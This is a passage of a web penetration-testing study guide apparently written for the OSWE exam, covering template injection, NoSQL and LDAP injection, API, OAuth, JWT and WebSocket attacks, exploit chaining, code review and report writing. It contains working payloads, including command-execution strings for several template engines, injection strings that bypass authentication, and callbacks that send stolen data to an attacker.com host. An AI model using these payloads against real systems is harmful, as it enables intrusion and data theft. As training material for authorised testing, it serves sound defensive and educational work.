├── Craft payload that makes external request
├── Monitor incoming DNS/HTTP for confirmation
└── Verify code execution via side-channel
```

### PHP/Python Deserialization

```
PHP OBJECT INJECTION:
├── unserialize() on user input
├── Magic methods: __construct(), __wakeup(), __destruct()
├── __toString() = forced string conversion
└── Exploitation: Chain magic methods → code execution

Python Pickle:
├── pickle.loads() = unsafe deserialization
├── __reduce__() magic method
├── Execute arbitrary code during unpickling
└── Alternative: Use pickle.loads() with restrictive loader

KEY PRINCIPLE:
Never deserialize untrusted data.
Always use type-safe serialization (JSON).
If deserialization required:
├── Cryptographic signature
├── Whitelist allowed classes
└── Use safe deserialization libraries
```

---

## MODULE 11: Server-Side Template Injection

### SSTI Detection & Exploitation

**Injecting code into template engines:**

```
SSTI IDENTIFICATION:

Test 1: Arithmetic
├── Template: Hello {{name}}
├── Inject: {{7*7}}
├── Vulnerable: Hello 49
├── Safe: Hello {{7*7}}

Test 2: String concatenation
├── Inject: {{7*'7'}}
├── Vulnerable: Hello 49
├── Safe: Template error

EXPLOITATION:

Jinja2 (Python):
├── Template: {{request.application.globals.__builtins__.__import__('os').popen('id').read()}}
├── Or: {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
└── Result: Command execution, output in response

Freemarker (Java):
├── Template: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
└── Result: Command execution

ERB (Ruby):
├── Template: <%= system('whoami') %>
└── Result: Command execution

Velocity (Java):
├── Template: #set($foo='')#set($rt=$foo.class.forName('java.lang.Runtime'))#set($chr=$foo.class.forName('java.lang.Character'))#set($str=$foo.class.forName('java.lang.String'))$rt.getRuntime().exec('whoami')
└── Result: Command execution

BLIND SSTI:
├── No output directly visible
├── Use timing delays: {{7*7*7*7*7*7*7*7*7*7}} (CPU intensive)
├── Measure response time
├── Confirm vulnerability via side-channel
└── Use DNS/HTTP callbacks for data exfiltration
```

---

## MODULE 12: NoSQL & Injection Variants

### MongoDB Injection

**Exploiting NoSQL query logic:**

```
BASIC MongoDB INJECTION:

Normal Query:
db.users.find({username: "admin", password: "pass123"})

Injection Attack:
username: admin
password: {$ne: ""} (NOT EQUAL - matches any document)

Query becomes:
db.users.find({username: "admin", password: {$ne: ""}})

Result:
├── Password field not empty condition always true
├── Authentication bypassed
├── User "admin" logged in without password

OPERATOR INJECTION:

$gt (Greater Than):
username: {$gt: ""} (all usernames > "")
password: {$gt: ""}
Result: First user in collection (usually admin)

$regex (Regular Expression):
username: {$regex: "^ad.*"}  (startswith "ad")
password: {$ne: null}
Result: Find all users starting with "ad"

$or (OR Logic):
{"$or": [{"admin": true}, {"user": true}]}
Result: Retrieve all docs with admin=true OR user=true

BLIND NoSQL INJECTION:
├── Time-based: $where with sleep()
├── Boolean-based: $where with conditional logic
├── Exfiltrate characters: Char by char comparison
└── Tool: nosqlmap for automated exploitation
```

### LDAP Injection

**LDAP query filter manipulation:**

```
LDAP QUERY SYNTAX:
(&(objectClass=person)(uid=username))

INJECTION ATTACK:
username: *)(|(uid=* 
password: anything

Query becomes:
(&(objectClass=person)(uid=*)(|(uid=*))
Filter logic: all objects where uid starts with * (all users)

BYPASS AUTHENTICATION:
username: *
password: anything
Query: (&(objectClass=person)(uid=*))
Result: Matches first user in LDAP (usually admin)

WILDCARD INJECTION:
username: admin*)
password: anything
Query: (&(objectClass=person)(uid=admin*))
Result: All users starting with "admin"

ENUMERATION:
Iteratively test characters:
username: admin*
Results show matching users
username: admi*
Results narrow down possibilities
```

---

## MODULE 13: API Security

### REST API Vulnerabilities

**API-specific exploitation techniques:**

```
ENDPOINT ENUMERATION:

Discover hidden endpoints:
├── Burp Scanner (active scan)
├── Directory brute force: /api/v1/users, /api/v1/admin, etc.
├── GitHub reconnaissance (leaked API docs)
├── Swagger/OpenAPI files: /api/swagger.json, /openapi.json
└── Archive.org (wayback machine for older API versions)

IDOR IN APIS:

Classic IDOR:
GET /api/users/123/profile
GET /api/users/124/profile (different user)

Hash-based IDOR:
GET /api/users/550e8400-e29b-41d4-a716-446655440000/profile
Brute force OR crack hash pattern

AUTHENTICATION HEADER BYPASS:
├── Try without Authorization header
├── Try empty Authorization: ""
├── Try Authorization: Bearer (no token)
├── Try incorrect format: Authorization: Token xyz
└── Observe if request succeeds despite auth error

API RATE LIMITING BYPASS:
├── X-Forwarded-For header manipulation
├── Proxy rotation (circuit through different IPs)
├── Time distribution (spread requests over time)
└── Concurrent connections (overwhelm rate counter)

PARAMETER POLLUTION:
├── Send same parameter multiple times
├── server.process(params[0]), params[1] ignored
├── Different versions of API parse differently
└── Bypass validation with parameter duplication
```

### GraphQL Vulnerabilities

```
INTROSPECTION QUERY ABUSE:

Normal GraphQL:
query {
  user(id: "123") {
    name
    email
  }
}

Introspection enabled (info disclosure):
query {
  __schema {
    types {
      name
      fields {
        name
        type
      }
    }
  }
}

Result: Full schema disclosure
├── All queries available
├── All mutations available
├── Input types revealed
└── Enables comprehensive attack mapping

QUERY COMPLEXITY ATTACK:
Deeply nested query = CPU intensive
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              # Repeated 100+ levels
            }
          }
        }
      }
    }
  }
}

Result: DoS via resource exhaustion

BATCH QUERY ATTACK:
GraphQL allows multiple queries in one request
[
  {query: "mutation{deleteUser(id:1){id}}"},
  {query: "mutation{deleteUser(id:2){id}}"},
  ...
  {query: "mutation{deleteUser(id:1000){id}}"}
]

Result: No rate limiting per query, bypass rate limits

ALIASING FOR ENUMERATION:
query {
  user1: user(id: "1") {name}
  user2: user(id: "2") {name}
  user3: user(id: "3") {name}
  ...
  user1000: user(id: "1000") {name}
}

Result: Enumerate 1000 users in single request
```

---

## MODULE 14: OAuth & OpenID Connect

### OAuth 2.0 Attack Vectors

**Modern authentication protocol exploitation:**

```
AUTHORIZATION CODE FLOW:
1. User: Click "Login with Google"
2. App → Google: redirect_uri + client_id + scope
3. Google: User authenticates
4. Google → App: authorization_code + state
5. App → Google (backend): code + client_secret
6. Google → App: access_token
7. App: Authenticated as user

ATTACK: Redirect URI Whitelist Bypass
├── Whitelist: https://example.com/callback
├── Attack: https://example.com.attacker.com/callback
├── Or: https://example.com/callback?param=attacker.com
├── Or: https://127.0.0.1:8080/ (localhost allowed)
└── Intercept auth code → access_token obtained

ATTACK: State Parameter Bypass
├── State param ensures flow validity
├── Bypass: Ignore state validation
├── Modify auth code before server validation
├── CSRF: Make victim click attacker's login link
│         │→ User logs into attacker's account
│         │→ Attacker's token used for victim's session

ATTACK: Scope Expansion
├── App requests: scope=email
├── Modify request: scope=email+profile+calendar
├── Server approves extra scopes
├── App gets more permissions than intended

ATTACK: Implicit Flow Issues
├── Authorization code sent directly to client
├── No secure backend exchange
├── Leaked in browser history/logs
├── JavaScript access = XSS risk

ATTACK: Refresh Token Abuse
├── Refresh token = long-lived access
├── No expiration on refresh token
├── Steal refresh token = permanent access
├── Reuse across multiple sessions
```

### JWT Token Exploitation

```
JWT STRUCTURE:
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

ATTACK 1: None Algorithm
├── Decode JWT: {"alg": "none", ...}
├── Modify payload: {"user_id": "1", "admin": true}
├── Remove signature
└── Server accepts if "none" algorithm allowed

ATTACK 2: Weak Secret
├── HMAC-SHA256 with weak key
├── John the Ripper: john --wordlist=passwords jwt.txt
├── Re-sign with cracked key
└── Inject modified claims

ATTACK 3: Algorithm Confusion
├── Key sent as RS256 (RSA public key)
├── Attacker switches to HS256 (HMAC symmetric)
├── Server uses RSA public key as HMAC secret
├── Attacker signs token = forge valid JWT

ATTACK 4: Key ID (kid) Header Injection
├── "kid": "../../../../etc/passwd"
├── Server tries to use /etc/passwd as signing key
├── Predictable key location → exploit

ATTACK 5: Expired Token Acceptance
├── Check if "exp" claim verified
├── Token: {"exp": 1234567890, "admin": true}
├── If not verified = permanent admin access

ATTACK 6: Privilege Escalation
├── Original token: {"user_id": 123, "role": "user"}
├── Modify: {"user_id": 123, "role": "admin"}
├── Re-sign with weak/none algorithm
└── Access admin functions
```

---

## MODULE 15: WebSocket Security

### WebSocket Exploitation

**Real-time bidirectional communication vulnerabilities:**

```
WEBSOCKET BASICS:

HTTP Upgrade:
GET /chat HTTP/1.1
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==

Server:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade

Now: Persistent TCP connection, full-duplex

VULNERABILITIES:

1. NO CSRF PROTECTION
   ├── WebSocket frames unaffected by CSRF tokens
   ├── Cross-origin WebSocket connection allowed
   ├── Attacker controls message content
   └── No Same-Origin Policy enforcement

2. AUTHENTICATION BYPASS
   ├── Initial HTTP handshake = authenticated
   ├── Subsequent WebSocket frames trust early auth
   ├── Reconnect with old session ID
   └── Session validation happens once, reused

3. MESSAGE MANIPULATION
   ├── Intercept WebSocket frames
   ├── Modify frame content
   ├── Send forged messages
   └── Server trusts WebSocket layer (past HTTP)

4. SESSION FIXATION
   ├── WebSocket session = independent from HTTP
   ├── Attack: Force victim into WebSocket connection
   ├── Steal WebSocket session ID
   └── Send malicious frames as victim

EXPLOITATION:
1. Identify WebSocket endpoint: wss://chat.example.com
2. Intercept connection (Burp WebSocket support)
3. Send malicious frame: {"action": "admin", "id": 123}
4. Server processes without validation
5. Attacker gains unauthorized access
```

---

## MODULE 16: Advanced Exploitation

### Vulnerability Chaining

**Combining multiple flaws for maximum impact:**

```
COMMON CHAINS:

Chain 1: XSS → Account Takeover
├── Stored XSS in profile
├── JavaScript steals session cookie
├── Send to attacker's server
├── Attacker uses cookie for session hijacking
└── Full account access without password

Chain 2: SSRF → Internal API → Database
├── SSRF to internal API
├── API returns sensitive data
├── SQL Injection in API backend
├── Dump entire database
└── Customer PII exposed

Chain 3: XXE → File Disclosure → Credential Theft
├── XXE: Read /etc/passwd
├── Extract username from /etc/passwd
├── XXE: Read ~/.ssh/id_rsa
├── Use private key for SSH access
└── Lateral movement to other systems

Chain 4: JWT Weak Key → Token Forgery → Privilege Escalation
├── Extract JWT from browser storage
├── Brute force secret (weak key)
├── Forge new JWT with admin role
├── Use token to access admin functions
└── Modify application configuration

METHODOLOGY:
1. Map attack surface (all inputs/outputs)
2. Identify individual vulnerabilities
3. Trace data flow between components
4. Find chain that leads to impact
5. Execute combined attack
6. Document assumptions and timing
```

### Blind Exploitation Techniques

**Extracting data when output is hidden:**

```
TIMING-BASED ATTACKS:

Boolean-based Timing:
├── Condition TRUE: Response time = normal (200ms)
├── Condition FALSE: Response time = delayed (5000ms)
├── Payload: ?id=1' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
├── If 5 second delay: first char = 'a'
├── Repeat for all characters

Bandwidth Exhaustion:
├── Condition TRUE: Load heavy resource (10MB file)
├── Condition FALSE: Load light resource (1KB file)
├── Measure response size
├── Infer condition from size difference

DNS CALLBACK:
├── Server makes DNS query: secret.attacker.com
├── Attacker monitors DNS requests
├── Payload exfiltrates in subdomain: <data>.attacker.com
├── Example: admin.attacker.com = user is admin
└── Confirms condition via DNS lookup

HTTP CALLBACK:
├── Server makes HTTP request: http://attacker.com?data=<secret>
├── Attacker's server logs incoming requests
├── Extract data from User-Agent, referer, or query param
└── Full data exfiltration in single callback

ERROR-BASED (INFERENCING):
├── Different error messages for different conditions
├── "Invalid username" vs "Invalid password"
├── Brute force usernames via error message
├── Refine attack based on error type
```

---

## MODULE 17: Source Code Review

### Identifying Vulnerabilities in Code

**Manual code audit for security flaws:**

```
CODE REVIEW METHODOLOGY:

CRITICAL AREAS:
1. INPUT HANDLING
   ├── Where does user input enter?
   ├── Is it validated?
   ├── Is it sanitized?
   ├── How is it used downstream?
   └── Can it reach dangerous sinks?

2. DANGEROUS FUNCTIONS
   ├── eval(), exec() = arbitrary code
   ├── unserialize() = object injection
   ├── system(), shell_exec() = command injection
   ├── mysql_query() = SQL injection (deprecated anyway)
   ├── echo/print with user data = XSS
   └── file_get_contents($_GET['file']) = LFI

3. AUTHENTICATION
   ├── Password hashing algorithm (bcrypt? salted?)
   ├── Session management (secure tokens?)
   ├── Token validation (on every request?)
   ├── Login attempt rate limiting?
   └── Privilege checks before sensitive operations?

4. BUSINESS LOGIC
   ├── State validation (order can't be "completed" then "paid")
   ├── Race conditions (concurrent requests)
   ├── Price manipulation (where's price validated?)
   ├── Authorization checks (who can access what?)
   └── Idempotency (same request = same result)

VULNERABLE PATTERNS:

SQL Injection:
query = "SELECT * FROM users WHERE username='" + user_input + "'"

XXS:
document.getElementById('result').innerHTML = user_input

Command Injection:
os.system("ping " + hostname_from_user_input)

Weak Crypto:
hashlib.md5(password).hexdigest()  # MD5 is fast (bad for passwords)

Hardcoded Secrets:
api_key = "sk_live_abcdef123456"  # In source code

Path Traversal:
open('/uploads/' + filename)  # No validation

SAFE PATTERNS:

Parameterized Queries:
cursor.execute("SELECT * FROM users WHERE username=?", [user_input])

Context-Aware Output Encoding:
html_encode(user_input)  # For HTML context
js_encode(user_input)    # For JavaScript context
url_encode(user_input)   # For URL context

Proper Hashing:
bcrypt.hashpw(password, bcrypt.gensalt())

Input Validation:
if not re.match(r"^[a-zA-Z0-9_]{3,20}$", username):
    raise ValueError("Invalid username")
```

---

## MODULE 18: Exam Strategy

### Methodology & Approach

**24-hour practical web penetration test:**

```
TIME ALLOCATION:

0-2 hours: Setup & Reconnaissance
├── Access lab environment
├── Configure Burp Suite
├── Map application structure
├── Identify all endpoints
├── Document findings

2-4 hours: Automated Scanning
├── Run Burp active scan
├── Identify quick wins
├── Note vulnerable parameters
├── Document initial findings

4-6 hours: Manual Testing
├── Test authentication bypass
├── Test authorization/IDOR
├── Test input validation
├── Test business logic
├── Document vulnerabilities

6-20 hours: Deep Exploitation
├── Exploit found vulnerabilities
├── Chain vulnerabilities if possible
├── Extract sensitive data
├── Achieve full compromise
├── Document attack scenarios

20-22 hours: Cleanup & Documentation
├── Verify all findings
├── Take screenshots/evidence
├── Write detailed explanations
├── Create reproducible steps

22-24 hours: Report Writing
├── Professional formatting
├── Clear vulnerability descriptions
├── Impact assessment
├── Recommendations for fixes
├── Executive summary

TESTING CHECKLIST:

HTTP LAYER:
☐ HTTP method override (X-HTTP-Method-Override)
☐ HTTPS downgrade
☐ Header injection
☐ Cookie manipulation
☐ User-Agent variation

AUTHENTICATION:
☐ Default credentials
☐ Brute force (with rate limit bypass)
☐ Session fixation
☐ Session hijacking
☐ Password reset flaws
☐ 2FA bypass

AUTHORIZATION:
☐ IDOR (sequential, hash-based)
☐ Privilege escalation
☐ Horizontal escalation
☐ Vertical escalation
☐ Direct object reference

INPUT VALIDATION:
☐ SQL injection (union, blind, time-based)
☐ XSS (reflected, stored, DOM)
☐ Command injection
☐ File inclusion (LFI, RFI)
☐ XXE injection
☐ SSTI

BUSINESS LOGIC:
☐ Price manipulation
☐ Coupon duplication
☐ State manipulation
☐ Process bypass
☐ Race conditions

API:
☐ Authentication bypass
☐ Rate limiting bypass
☐ Parameter pollution
☐ Hidden endpoints
☐ GraphQL introspection
```

### Report Writing

**Professional documentation of findings:**

```
REPORT STRUCTURE:

1. EXECUTIVE SUMMARY
├── High-level overview
├── Risk rating (Critical/High/Medium/Low)
├── Main findings
├── Recommendations
└── Business impact (in terms management understands)

2. DETAILED FINDINGS

For each vulnerability:
├── TITLE
│   Clear, specific name
│
├── SEVERITY
│   CVSS score or rating
│
├── DESCRIPTION
│   What is the vulnerability?
│   Why is it a problem?
│
├── AFFECTED COMPONENTS
│   Which endpoints/parameters?
│   Which users affected?
│
├── STEPS TO REPRODUCE
│   Exact commands
│   Screenshots
│   URLs with parameters
│
├── PROOF OF CONCEPT
│   Screenshot showing impact
│   Data extracted/modified
│
├── IMPACT
│   What can attacker do?
│   Business consequences
│   Customer data at risk?
│
├── REMEDIATION
│   How to fix?
│   What library/approach?
│   Why this solution?
│
└── REFERENCES
    CVE numbers
    OWASP links
    Tool documentation

3. ATTACK NARRATIVE
├── How did you compromise the application?
├── What chain of attacks did you use?
├── Timeline of steps
├── Data exfiltrated
└── Full system compromise details

4. APPENDIX
├── Burp Scanner results
├── Tool output
├── Additional test results
└── Environment details

EVIDENCE STANDARDS:
├── Every claim has supporting evidence
├── Screenshots dated (browser, not fabricated)
├── URLs visible in screenshots
├── Input and output clearly shown
├── Multiple screenshots per complex exploit
└── Clean, professional presentation
```

---

## Quick Reference

### Tools & Resources

```
MUST-HAVE TOOLS:
├── Burp Suite (proxy, scanner, repeater)
├── SQLMap (SQL injection automation)
├── Zaproxy (open source scanner alternative)
├── Hashcat (password cracking)
├── Wireshark (network analysis)
├── curl/wget (command-line HTTP)
└── jq (JSON parsing)

PAYLOADS & WORDLISTS:
├── PayloadsAllTheThings (GitHub)
├── SecLists (common wordlists)
├── fuzzdb (FTP fuzzing dictionaries)
├── OneListForAll (top URLs)
└── Custom wordlists from OSINT

REFERENCE MATERIAL:
├── OWASP Top 10 (web vulnerabilities)
├── OWASP API Security Top 10
├── Web Security Academy (Portswigger)
├── HackerOne disclosed reports
├── CVSS Calculator (severity rating)
└── CWE (Common Weakness Enumeration)
```

---

## Final Principles

**Key concepts to master:**

```
1. UNDERSTAND WHY ATTACKS WORK
   ├── Not just "how to exploit"
   ├── Understand application logic
   ├── Know developer assumptions
   └── Predict failure points

2. THINK LIKE DEFENDER
   ├── What are developers trying to protect?
   ├── What assumptions might they have?
   ├── Where might they have gaps?
   └── How would I detect this attack?

3. DOCUMENT EVERYTHING
   ├── Every step reproducible
   ├── Screenshots of evidence
   ├── Clear explanations
   └── Timeline of events

4. ETHICS & PROFESSIONALISM
   ├── Only test what you're authorized to test
   ├── Don't access data you don't need
   ├── Delete artifacts after testing
   ├── Provide value to organization
   └── Be respectful in communication

5. CONTINUOUS LEARNING
   ├── Read security advisories
   ├── Follow security researchers
   ├── Practice on CTF platforms
   ├── Study real breaches (disclosure reports)
   └── Share knowledge with community
```

---

**OSWE | Offensive Security | "The goal is not to hack the application. The goal is to understand WHY the application is hackable."**

**By DarcHacker**  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Last Updated:** 2026-07-04  
**Document Status:** Complete & Production-Ready
